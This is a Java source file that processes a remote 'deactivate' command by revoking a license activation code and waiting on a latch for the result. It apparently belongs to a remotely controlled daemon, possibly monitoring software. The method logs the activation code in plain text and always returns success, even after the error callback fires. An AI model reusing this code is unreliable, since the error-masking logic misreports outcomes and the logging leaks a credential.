package com.fx.maind.commands;

import java.util.concurrent.CountDownLatch;

import com.daemon_bridge.CommandResponseBase;
import com.daemon_bridge.SendDeactivateCommand;
import com.daemon_bridge.SendDeactivateCommandResponse;
import com.vvt.activation_manager.ActivationListener;
import com.vvt.activation_manager.ActivationManager;
import com.vvt.daemon.appengine.AppEngine;
import com.vvt.datadeliverymanager.enums.ErrorResponseType;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;

public class DeactivateCommandProcess {
	private final static String TAG = "DeactivateCommandProcess";
	private static CountDownLatch mWaitForResponseLatch;
	private static SendDeactivateCommandResponse sendDeactivateCommandResponse;
	
	public static CommandResponseBase execute(AppEngine sAppEngine, SendDeactivateCommand deactivateCommand) {
		
		try {
			ActivationManager activationManager = sAppEngine.getActivationManager();
			String activationCode = sAppEngine.getLicenseManager().getLicenseInfo().getActivationCode();
			
			FxLog.v(TAG, "execute # activationCode :" + activationCode);
			mWaitForResponseLatch = new CountDownLatch(1);
			
			activationManager.deactivate(activationCode, mActivationListener);
			
			//Block the thread and wait till onSuccess or onError called.
			try { mWaitForResponseLatch.await(); } catch (InterruptedException e) {
				FxLog.e(TAG, e.getMessage());
			}
			
			sendDeactivateCommandResponse = new SendDeactivateCommandResponse(CommandResponseBase.SUCCESS);
			sendDeactivateCommandResponse.setResponseMsg(MessageManager.DEACTIVATE_SUCCESS);
		}
		catch(Throwable t) {
			FxLog.e(TAG, t.toString());
			
			sendDeactivateCommandResponse = new SendDeactivateCommandResponse(CommandResponseBase.ERROR);
			sendDeactivateCommandResponse.setResponseMsg(MessageManager.DEACTIVATE_ERROR);
		}
		
		FxLog.v(TAG, "execute # EXIT ...");
		return sendDeactivateCommandResponse;
	}
	
	
	
	static ActivationListener mActivationListener = new ActivationListener() {
		
		@Override
		public void onSuccess() {
			FxLog.v(TAG, "ActivationListener onSuccess");
			
			sendDeactivateCommandResponse = new SendDeactivateCommandResponse(CommandResponseBase.SUCCESS);
			sendDeactivateCommandResponse.setResponseMsg(MessageManager.DEACTIVATE_SUCCESS);
			mWaitForResponseLatch.countDown();
		}
		
		@Override
		public void onError(ErrorResponseType errorType, int code, final String msg) {
			FxLog.e(TAG, "ActivationListener # onError");
			
			sendDeactivateCommandResponse = new SendDeactivateCommandResponse(CommandResponseBase.ERROR);
			sendDeactivateCommandResponse.setResponseMsg(MessageManager.getErrorMessage(code));

			FxLog.e(TAG, "ActivationListener # error:" + MessageManager.getErrorMessage(code));
			mWaitForResponseLatch.countDown(); 
		}
	};

}
